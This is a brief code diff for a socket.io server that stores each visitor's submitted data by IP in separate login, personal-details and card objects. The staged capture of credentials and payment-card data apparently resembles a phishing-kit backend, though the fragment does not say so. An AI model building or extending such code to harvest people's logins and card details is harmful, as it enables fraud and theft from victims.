@@ -250,8 +250,10 @@ io.on('connection', (socket, req) => {
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
-            if (!userDetails.getUserData) {
-            userDetails.getUserData = {};
+            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard) {
+            userDetails.getUserDataLogin = {};
+                userDetails.getUserDataDetails = {};
+                userDetails.getUserDataCard = {};
         }
         if(userDetails.stage == 'Login'){
             userDetails.getUserDataLogin = data
